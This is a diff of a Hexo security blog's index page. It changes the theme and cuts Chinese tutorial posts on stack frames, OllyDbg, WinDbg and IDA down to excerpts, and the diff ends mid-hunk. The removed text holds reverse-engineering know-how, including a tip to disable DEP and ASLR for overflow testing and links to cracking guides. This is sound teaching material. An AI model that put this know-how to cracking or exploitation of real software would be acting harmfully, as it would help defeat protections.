@@ -2,8 +2,10 @@
 
 
 
+  
 
-<html class="theme-next pisces" lang="zh-Hans">
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
 <head>
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -43,16 +45,48 @@
 
 
 
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
 
 
 
 
 
 
-<link href="/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="//main.css?v=" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
+
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
 
 
 
@@ -62,6 +96,8 @@
 
 
 
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
 
 
 
@@ -81,10 +117,10 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Pisces',
-    sidebar: "",
-    fancybox: ,
-    motion: ,
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
     duoshuo: {
       userId: 'undefined',
       author: '博主'
@@ -100,6 +136,8 @@
 </script>
 
 
+
+  <link rel="canonical" href="http://kevien.github.io/page/4/"/>
 
 
 
@@ -127,8 +165,10 @@
 
   
   
+    
+  
 
-  <div class="container  
+  <div class="container sidebar-position-left 
    page-home 
  ">
     <div class="headband"></div>
@@ -146,7 +186,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle"></p>
+        <h1 class="site-subtitle" itemprop="description"></h1>
       
   </div>
 
@@ -163,7 +203,97 @@
   
 
   
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
 
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
   
 </nav>
 
@@ -205,7 +335,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -215,11 +345,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-23T21:45:03+08:00">
+                2017-08-23
+              </time>
             
 
             
@@ -239,6 +379,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -254,18 +425,17 @@
       
         
           
-            <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>栈帧 stack frame<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4></li>
-<li>主要通过od来跟踪调试一下，理解一下windows栈的调用情况。<h4 id="环境及代码"><a href="#环境及代码" class="headerlink" title="环境及代码"></a>环境及代码</h4>环境win7 32位+vc6.0<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdio.h&quot;</div><div class="line"></div><div class="line">long add(long a, long b)</div><div class="line">&#123;</div><div class="line">    long x = a, y = b;</div><div class="line">    return (x + y);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char* argv[])</div><div class="line">&#123;</div><div class="line">    long a = 1, b = 2;</div><div class="line">    </div><div class="line">    printf(&quot;%d\n&quot;, add(a, b));</div><div class="line">	</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>在这之前，首先找到main函数，并加上一定的注释以及对应的断点。<br>1.首先是进入main函数之前，我们查看一下ebp的值是0012ff88，esp是0012ff50，注意此时下一条指令的地址是00401279，如下图<br><img src="/2017/08/23/栈帧/1.png" alt=""><br>2.这个时候f7进入main函数，这个时候esp变成0012ff4c即减小了4，ebp不变<br><img src="/2017/08/23/栈帧/2.png" alt=""><br>3.然后有一个跳转到push ebp，所以执行这个代码时候，ebp的值会入栈，esp的值加4，变成00112ff48<br><img src="/2017/08/23/栈帧/3.png" alt=""><br>4.f8执行 mov ebp,esp命令，这个时候ebp的值发生变化，变成和esp一样的值都是0012ff48<br><img src="/2017/08/23/栈帧/4.png" alt=""><br>5.f8执行 sub esp,48 扩展栈空间，esp减小48h个长度，ebp保持不变<br><img src="/2017/08/23/栈帧/5.png" alt=""><br>6.f8 然后就是将ebx，esi，edi等入栈的操作等<br>。。。<br>7.函数的返回要注意清场,栈顶和栈底是一样的都是0012ff48<br><img src="/2017/08/23/栈帧/6.png" alt=""><br>8.f8执行pop ebp，这个时候是将栈顶中的值0012ff88放到ebp中，那么ebp的值发生变化成为0012ff88，执行pop操作，esp+4 为0012ff4c<br><img src="/2017/08/23/栈帧/7.png" alt=""><br>9.f8 执行retn指令，esp发生变化+4变为0012ff50，ebp的值为0012ff88，eip指向00401279，即call main函数的下一条指令执行<br><img src="/2017/08/23/栈帧/8.png" alt=""></p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
-<li>main函数的过程中，进入之前栈底指针ebp是0012ff88，栈顶指针是0012ff50，结束函数之后，没有发生变化，即栈维持这平衡。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
-<li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-9426.html</a></li>
-</ul>
-
-          
+          TL;DR
+栈帧 stack frame前言
+主要通过od来跟踪调试一下，理解一下windows栈的调用情况。环境及代码环境win7 32位+vc6.012345678910111213141516#include &quot;stdio.h&quot;long add(long a, long b
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/23/栈帧/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -324,7 +494,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -334,11 +504,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-22T10:56:17+08:00">
+                2017-08-22
+              </time>
             
 
             
@@ -358,6 +538,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -373,33 +584,22 @@
       
         
           
-            <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>ollydbg有官方的下载的版本，也有其它修改版，其中我们最常用的是吾爱破解版本的od，其插件较多，较为方便。后面的介绍也是基本以吾爱破解的版本为主。<h4 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h4></li>
-<li>f8单步步过</li>
-<li>f7单步步入</li>
-<li>f9运行，执行到下个断点</li>
-<li>f2下断点</li>
-<li>ctrl + g 跳转到指定地址</li>
-<li>ctrl+f9执行到返回，遇到断点会停下<h4 id="一些常用的操作"><a href="#一些常用的操作" class="headerlink" title="一些常用的操作"></a>一些常用的操作</h4></li>
-<li>可通过双击汇编窗口注释区或者右键给汇编代码添加注释，方便自己后续阅读，这里有一个小技巧，可以通过ida的静态分析方法进行静态分析加注释<br><img src="/2017/08/22/OllyDbg使用入门/1.png" alt=""><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4></li>
-<li>主视图切换<br><img src="/2017/08/22/OllyDbg使用入门/views.png" alt=""></li>
-<li>有时候在调试的时候，一直在循环里，如果想要跳出循环，这个时候鼠标点到下一个命令的执行处，f4即可，即运行到当前代码处</li>
-<li>在用vs较高版本编译程序测试溢出等的时候注意要关闭保护功能(如常见的dep以及aslr)，在项目菜单的属性里面设置<br><img src="/2017/08/22/OllyDbg使用入门/aslr.png" alt=""><br><img src="/2017/08/22/OllyDbg使用入门/sec.png" alt=""></li>
-<li>在跟踪调试的时候，我们关注的是每步执行过后寄存器的变化情况，这个时候观察寄存器的窗口，红色的表示是发生了变化的数据。<br><img src="/2017/08/22/OllyDbg使用入门/0.png" alt=""></li>
-<li>在进行动态分析的时候，最好完整的分析一个栈的出入过程，加上注释之后，对代码分析有好处</li>
-<li>刚开始调试的时候，容易跑飞，这个时候注意观察左上角的提示框，回显示你的module，不要进去了什么kernel模块</li>
-<li>注意由于基本上我们使用的系统上数据或者代码都是小端存储的，所以在看反汇编代码的时候看到机器码的时候，一定要倒过来看<br><img src="/2017/08/22/OllyDbg使用入门/2.png" alt=""></li>
-<li>通过菜单中的查看内存map，整个可执行文件结构在内存中的地址映射<br><img src="/2017/08/22/OllyDbg使用入门/3.png" alt=""><br>此外还有L可以查看log data信息，E查看可执行模块，B查看断点信息。</li>
-<li>在vc6编译的程序中，函数返回之前会有一句call  _checkesp，这里会有一个checkesp函数的调用，来检查栈是否平衡，如果不平衡会出现如下的错误，我在这里做一个测试，在return语句之前加一条内联汇编push ebx，这样就破坏了栈平衡如下图所示<br><img src="/2017/08/22/OllyDbg使用入门/4.png" alt=""></li>
-<li>vc中函数的调用方式是cdecl，这种函数调用约定对参数的传递依靠栈内存，在调用函数前，将通过压栈操作将参数从右至左依次送入栈中，当函数返回的时候，需要将参数使用的空间回收，这里的回收指的是恢复esp寄存器的值到函数调用前的值，对于cdecl调用方式而言，平衡堆栈的操作是由函数调用方来做的，在这里也就是要由main()函数来做的，可以看到反汇编代码add esp，8就是用来平衡栈的。主要用于平衡上面的两个push操作。<br><img src="/2017/08/22/OllyDbg使用入门/5.png" alt=""></li>
-<li>函数返回值通常保存在eax寄存器中，在c语言中，main()函数的返回值为0，即return0，因此xor eax,eax 就是对eax进行了清零操作。</li>
-<li>windows系统下，对API函数的调用遵循约定是stdcall，对于stdcall而言，参数依然是从右向左依次入栈，而参数的平栈则是在api函数内部完成的，而不是在函数调用时候完成的。<br><a href="6.png"></a><br>上图中可以看到在调用MessageBox()的时候,在retn指令后面加了一个10，10这里是十六进制，也就是十进制中的16，我们在为MessageBoxA传递参数的时候，每个参数是4字节，4*4=16个字节，因此retn 16除了有返回的作用外，还包含了add esp,10的作用。<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4></li>
-<li>在看雪上有人翻译了国外人写的&lt;使用ollydbg从零开始cracking&gt;，还是挺详细的介绍了od的使用，推荐阅读和动手跟一遍。<br><a href="https://bbs.pediy.com/thread-184679.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-184679.htm</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li>OllyDbg 入门系列<br><a href="http://bbs.pediy.com/user-24467-3-1.htm" target="_blank" rel="external">http://bbs.pediy.com/user-24467-3-1.htm</a></li>
-<li>拿几个ctf的简单题目练习一下<br><a href="https://github.com/lcatro/SISE_Traning_CTF_RE" target="_blank" rel="external">https://github.com/lcatro/SISE_Traning_CTF_RE</a></li>
-</ul>
-
-          
+          TL;DR
+ollydbg有官方的下载的版本，也有其它修改版，其中我们最常用的是吾爱破解版本的od，其插件较多，较为方便。后面的介绍也是基本以吾爱破解的版本为主。常用快捷键
+f8单步步过
+f7单步步入
+f9运行，执行到下个断点
+f2下断点
+ctrl + g 跳转到指定地址
+ctrl+f9执行到返
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/22/OllyDbg使用入门/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -458,7 +658,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -468,11 +668,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-21T09:00:27+08:00">
+                2017-08-21
+              </time>
             
 
             
@@ -492,6 +702,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -507,9 +748,15 @@
       
         
           
-            <h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://bbs.pediy.com/thread-94457.htm" target="_blank" rel="external">WinDbg学习笔记（一）–认识WinDbg</a><br><a href="http://bbs.pediy.com/thread-34379.htm" target="_blank" rel="external">从Ollydbg说起—–WinDbg用户态调试教程</a><br><a href="http://bbs.pediy.com/thread-34958.htm" target="_blank" rel="external">Windbg基本调试技术</a><br><a href="http://1drv.ms/1q2aPk6" target="_blank" rel="external">Windows 调试器 WinDBG 和 KD 学习系列 PPT</a>(<a href="https://www.youtube.com/watch?v=8zBpqc3HkSE&amp;list=PLhx7-txsG6t6n_E2LgDGqgvJtCHPL7UFu)(https://www.youtube.com/user/TheSourceLens)(https://www.youtube.com/user/TheSourceLens" target="_blank" rel="external">https://www.youtube.com/watch?v=8zBpqc3HkSE&amp;list=PLhx7-txsG6t6n_E2LgDGqgvJtCHPL7UFu)(https://www.youtube.com/user/TheSourceLens)(https://www.youtube.com/user/TheSourceLens</a>)</p>
-
-          
+          ReferenceWinDbg学习笔记（一）–认识WinDbg从Ollydbg说起—–WinDbg用户态调试教程Windbg基本调试技术Windows 调试器 WinDBG 和 KD 学习系列 PPT(https://www.youtube.com/watch?v=8zBpqc3HkSE&amp;l
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/21/windbg使用/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -568,7 +815,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -578,11 +825,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-18T18:06:56+08:00">
+                2017-08-18
+              </time>
             
 
             
@@ -602,6 +859,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -617,27 +905,16 @@
       
         
           
-            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
-<li>先说说反汇编软件IDA原理，反汇编软件去识别二进制文件格式，比如文件的格式是PE，那么它会利用其针对PE的内置“规则“对该二进制文件进行分析，最终将其转换为“好看”一点儿，方便人们阅读的格式(其中包括视图展现形式、伪c代码、汇编代码等)，其本身并不会像ollydbg去加载程序执行。(当然IDA也能动态调试)</li>
-<li>IDA(Interactive Disassembler Professional)交互式反汇编专业版，是一款目前最棒的静态反编译软件，可以用来分析pe、elf等格式程序。</li>
-<li>较od的动态分析IDA提供了F5键(F5功能是一个插件)查看伪代码的功能，使用非常方便，在ctf的reverse题目中应用很多。<h4 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h4>在介绍常见操作之前，先来看一下用ida加载一个文件的时候，默认的展示窗口有哪些<br><img src="/2017/08/18/IDA使用/2.png" alt=""><br>注意在反汇编代码的窗口可以输入空格切换到Graphic View，可以更清楚的看清流程</li>
-<li>跳转到指定内存地址 快捷键G，可以调到相应的地址</li>
-<li>寻找关键特征字符串，打开字符串参考窗口 shift+f12 ，类似于od中plugins中的中文搜索引擎中的智能搜索功能<br><img src="/2017/08/18/IDA使用/1.png" alt=""></li>
-<li>函数的收缩和展开功能<br><img src="/2017/08/18/IDA使用/3.png" alt=""></li>
-<li>在vc6中main()不是程序运行的第一个函数，而是程序员编写程序的第一个函数，main()函数是由启动函数来调用的，vc6中入口点是_mainCRTStartup()函数，如下图所示<br><img src="/2017/08/18/IDA使用/4.png" alt=""><br>双击即可到达这个函数的位置，<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">.text:00401130                 push    ebp</div><div class="line">.text:00401131                 mov     ebp, esp</div><div class="line">.text:00401133                 push    0FFFFFFFFh</div><div class="line">.text:00401135                 push    offset stru_422130</div><div class="line">.text:0040113A                 push    offset __except_handler3</div><div class="line">.text:0040113F                 mov     eax, large fs:0</div><div class="line">.text:00401145                 push    eax</div><div class="line">.text:00401146                 mov     large fs:0, esp</div><div class="line">.text:0040114D                 add     esp, 0FFFFFFF0h</div><div class="line">.text:00401150                 push    ebx</div><div class="line">.text:00401151                 push    esi</div><div class="line">.text:00401152                 push    edi</div><div class="line">.text:00401153                 mov     [ebp+ms_exc.old_esp], esp</div><div class="line">.text:00401156                 call    ds:__imp__GetVersion@0 ; GetVersion()</div><div class="line">.text:0040115C                 mov     __osver, eax</div><div class="line">.text:00401161                 mov     eax, __osver</div><div class="line">.text:00401166                 shr     eax, 8</div><div class="line">.text:00401169                 and     eax, 0FFh</div><div class="line">.text:0040116E                 mov     __winminor, eax</div><div class="line">.text:00401173                 mov     ecx, __osver</div><div class="line">.text:00401179                 and     ecx, 0FFh</div><div class="line">.text:0040117F                 mov     __winmajor, ecx</div><div class="line">.text:00401185                 mov     edx, __winmajor</div><div class="line">.text:0040118B                 shl     edx, 8</div><div class="line">.text:0040118E                 add     edx, __winminor</div><div class="line">.text:00401194                 mov     __winver, edx</div><div class="line">.text:0040119A                 mov     eax, __osver</div><div class="line">.text:0040119F                 shr     eax, 10h</div><div class="line">.text:004011A2                 and     eax, 0FFFFh</div><div class="line">.text:004011A7                 mov     __osver, eax</div><div class="line">.text:004011AC                 push    0</div><div class="line">.text:004011AE                 call    __heap_init</div><div class="line">.text:004011B3                 add     esp, 4</div><div class="line">.text:004011B6                 test    eax, eax</div><div class="line">.text:004011B8                 jnz     short loc_4011C4</div><div class="line">.text:004011BA                 push    1Ch</div><div class="line">.text:004011BC                 call    fast_error_exit</div><div class="line">.text:004011C1 ; ---------------------------------------------------------------------------</div><div class="line">.text:004011C1                 add     esp, 4</div><div class="line">.text:004011C4</div><div class="line">.text:004011C4 loc_4011C4:                             ; CODE XREF: _mainCRTStartup+88j</div><div class="line">.text:004011C4                 mov     [ebp+ms_exc.registration.TryLevel], 0</div><div class="line">.text:004011CB                 call    __ioinit</div><div class="line">.text:004011D0                 call    ds:__imp__GetCommandLineA@0 ; GetCommandLineA()</div><div class="line">.text:004011D6                 mov     __acmdln, eax</div><div class="line">.text:004011DB                 call    ___crtGetEnvironmentStringsA</div><div class="line">.text:004011E0                 mov     __aenvptr, eax</div><div class="line">.text:004011E5                 call    __setargv</div><div class="line">.text:004011EA                 call    __setenvp</div><div class="line">.text:004011EF                 call    __cinit</div><div class="line">.text:004011F4                 mov     ecx, __environ</div><div class="line">.text:004011FA                 mov     ___initenv, ecx</div><div class="line">.text:00401200                 mov     edx, __environ</div><div class="line">.text:00401206                 push    edx             ; envp</div><div class="line">.text:00401207                 mov     eax, ___argv</div><div class="line">.text:0040120C                 push    eax             ; argv</div><div class="line">.text:0040120D                 mov     ecx, ___argc</div><div class="line">.text:00401213                 push    ecx             ; argc</div><div class="line">.text:00401214                 call    _main_0</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>如上所示，是进入这个函数后的汇编代码，可以看到main函数在00401214位置处，启动函数从00401130地址处开始，期间调用了GetVersion()函数获得了系统版本号，调用__heap_init函数初始化了程序所使用的堆空间，调用了GetCommandLineA()函数获取了命令行参数,调用_crtGetEnvironmentStringsA()获取了环境变量字符串，在完成一系列启动所需的工作之后，终于在00401214处调用了main()函数。</p>
-<ul>
-<li>在调用printf时候的指令为call printf,而调用像是MessageBoxA时候的指令是call    ds:<strong>imp</strong>MessageBoxA@16 ; MessageBoxA(x,x,x,x)，printf函数在stdio.h头文件中，该函数是c语言的静态库，在链接的时候会将其代码接入到二进制文件中(静态包含)，而MessageBoxA的函数实现是在user32.dll这个动态链接库中，在代码中，这里只是留了进入MessageBoxA函数的一个地址，并没有具体的代码，MessageBoxA的具体地址存放在数据节区中，因此在反汇编代码中给出了提示，使用了前缀”ds”,<strong>imp</strong>表示导入函数，@16表示16个字节，16/4即函数又4个参数。注意 在od中汇编代码是这样call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;]，感觉没有ida的友好。</li>
-<li>switch case default结构的特征<br><img src="/2017/08/18/IDA使用/6.png" alt=""></li>
-<li>名称与命名<br>在进行样本分析时，ID A识别出来的函数名都是sub_xxxxxx，这种命名方式不适合我们阅读和分析，在我们进行分析后，知道函数或者变量的意义，那么我们可以对其进行重命名。方法是鼠标点击函数名或者变量，然后按下键盘上的N键，在弹出的窗口中写入新的名字即可。</li>
-<li>交叉引用<br>IDA提供了大量显示和访问交叉引用数据的机制，它以更加直观的方式显示代码和数据之间的关系。在IDA中有两种交叉引用，一种是代码交叉引用，一种是数据交叉引用。如下就是一个代码交叉引用<br><img src="/2017/08/18/IDA使用/xref.png" alt=""><br>在图中可以知道被引用者是?test@@YAXXZ,_main+18是引用者，向下的键条表示引用者的地址要比?test@@YAXXZ的地址高，上行反之。还有其后面的P表示由函数调用导致的交叉引用使用后缀↓p（看做是Procedure）。而跳转交叉引用使用后缀↑j（看做是Jump）。此外还有数据的交叉引用又分为数据读取交叉引用、数据写入交叉引用、数据偏移量交叉引用。</li>
-<li>快捷键R 将数字串转换为char字符串</li>
-<li>IDA是一款非常复杂且非常非常强大，更多见《IDA Pro权威指南》<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="http://www.pediy.com/kssd/pediy12/ida.html" target="_blank" rel="external">IDA简易教程</a><br><a href="https://www.zybuluo.com/oro-oro/note/137244" target="_blank" rel="external">《IDA Pro权威指南》入门笔记</a><br><a href="https://blog.csdn.net/hgy413/article/details/50594320" target="_blank" rel="external">IDA-XREF（交叉引用）概述</a></li>
-</ul>
-
-          
+          前言
+先说说反汇编软件IDA原理，反汇编软件去识别二进制文件格式，比如文件的格式是PE，那么它会利用其针对PE的内置“规则“对该二进制文件进行分析，最终将其转换为“好看”一点儿，方便人们阅读的格式(其中包括视图展现形式、伪c代码、汇编代码等)，其本身并不会像ollydbg去加载程序执行。(当然IDA
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/18/IDA使用/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -696,7 +973,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -706,11 +983,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-16T18:53:23+08:00">
+                2017-08-16
+              </time>
             
 
             
@@ -730,6 +1017,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -745,74 +1063,18 @@
       
         
           
